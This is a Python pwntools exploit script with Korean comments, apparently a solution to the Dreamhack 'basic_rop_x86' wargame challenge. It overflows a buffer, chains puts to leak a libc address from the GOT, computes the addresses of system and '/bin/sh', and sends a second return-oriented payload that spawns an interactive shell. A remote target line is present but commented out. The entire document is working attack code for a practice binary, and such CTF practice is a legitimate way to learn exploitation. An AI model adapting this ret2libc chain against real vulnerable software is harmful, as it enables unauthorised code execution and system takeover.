from pwn import *

#32비트는 함수를 실행할 때 인자를 스택에 넣어주어야함, ebp+8, ebp+c, ebp+10...

context.arch = 'i386'
context.log_level = 'debug'

p = process('./basic_rop_x86')
#p = remote('host3.dreamhack.games', 24345)
e = ELF('./basic_rop_x86')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

puts_plt = e.plt['puts']
puts_got = e.got['puts']
main = e.symbols['main']

pop_ebx = 0x080483d9

#puts(puts_got)를 실행함으로 일단 got랑 plt주소를 가져옴
payload = b'a'*0x48
payload += p32(puts_plt)
payload += p32(pop_ebx)
payload += p32(puts_got)
payload += p32(main)

p.send(payload)
p.recvuntil(b'a'*0x40)
puts = u32(p.recvn(4))
libc_base = puts - libc.symbols['puts']
system = libc_base + libc.symbols['system']
binsh = libc_base + list(libc.search(b'/bin/sh'))[0]
log.info(f'puts: {hex(puts)}')
log.info(f'libc base: {hex(libc_base)}')
log.info(f'system: {hex(system)}')
log.info(f'/bin/sh: {hex(binsh)}')

payload = b'a'*0x48
payload += p32(system)
payload += p32(pop_ebx)
payload += p32(binsh)

p.send(payload)

p.interactive()